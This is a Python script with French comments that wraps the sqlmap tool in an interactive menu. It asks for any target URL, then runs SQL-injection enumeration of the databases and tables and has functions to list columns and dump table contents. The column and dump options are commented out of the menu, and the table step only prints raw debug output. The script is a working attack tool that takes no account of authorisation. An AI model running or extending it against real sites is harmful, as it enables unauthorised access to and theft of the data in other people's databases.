import subprocess
import re

# L'URL cible
url = input("Entrez l'url que vous vouler tester : ")  # Remplace par ton URL

def run_sqlmap(command):
    """ Exécute sqlmap et retourne la sortie """
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Erreur : {e.stderr}"

def get_databases():
    """ Récupère et nettoie la liste des bases de données SQL """
    print("\n[+] Récupération des bases de données...\n")
    command = ["python", "sqlmap/sqlmap.py", "-u", url, "--batch", "--dbs"]
    output = run_sqlmap(command)

    # Recherche la section contenant "available databases"
    match = re.search(r"available databases.*?:\n(.*?)\n\n", output, re.DOTALL)
    if match:
        databases = [db.strip() for db in match.group(1).split("\n") if db.strip()]
        
        # Exclure les bases système et les lignes parasites
        databases = [
            db for db in databases
            if "information_schema" not in db.lower() and  
               "starting @" not in db and
               "ending @" not in db and
               not re.search(r"\d{2}:\d{2}:\d{2}", db)  # Exclut les timestamps
        ]

        if databases:
            print("[✔] Bases de données trouvées :", databases)
            return databases
    print("[✖] Aucune base de données trouvée.")
    return []

def clean_db_name(db_name):
    """ Nettoie le nom de la base de données pour éviter les erreurs """
    return db_name.replace("[*]", "").strip()

def get_tables(db_name):
    """ Récupère et nettoie la liste des tables d'une base SQL """
    db_name = clean_db_name(db_name)  # Nettoyage du nom

    print(f"\n[+] Récupération des tables de la base '{db_name}'...\n")
    command = ["python", "sqlmap/sqlmap.py", "-u", url, "--batch", "-D", db_name, "--tables"]
    output = run_sqlmap(command)

    # Débogage : affiche la sortie brute pour identifier la structure
    print("\n*** DEBUG SQLMAP OUTPUT ***\n")
    print(output)



def get_columns(db_name, table_name):
    command = [
        "python", "sqlmap/sqlmap.py", "-u", url, "--batch", "-D", db_name, "-T", table_name, "--columns"
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout.split("\n")
        
        columns = []
        capture = False
        
        for line in output:
            if "Column names" in line:
                capture = True
                continue
            if capture and line.strip():
                columns.append(line.strip())
        
        return columns if columns else "Aucune colonne trouvée."
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exécution de sqlmap : {e}"



def dump_data(db_name, table_name):
    command = [
        "python", "sqlmap/sqlmap.py", "-u", url, "--batch", "-D", db_name, "-T", table_name, "--dump"
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exécution de sqlmap : {e}"

# Menu interactif
while True:
    #print("\n=== SQLMAP INTERACTIF ===")
    print("1. Lister les bases de données")
    print("2. Lister les tables d'une base")
    #print("3. Lister les colonnes d'une table")
    #print("4. Dumper les données d'une table")
    print("5. Quitter")

    choix = input("Choisissez une option (1-5) : ")

    if choix == "5":
        print("Bye !")
        break
    elif choix == "1":
        databases = get_databases()
    elif choix == "2":
        if 'databases' not in locals() or not databases:
            databases = get_databases()
        if databases:
            db_name = databases[0]  # Prend la première base de données trouvée
            tables = get_tables(db_name)

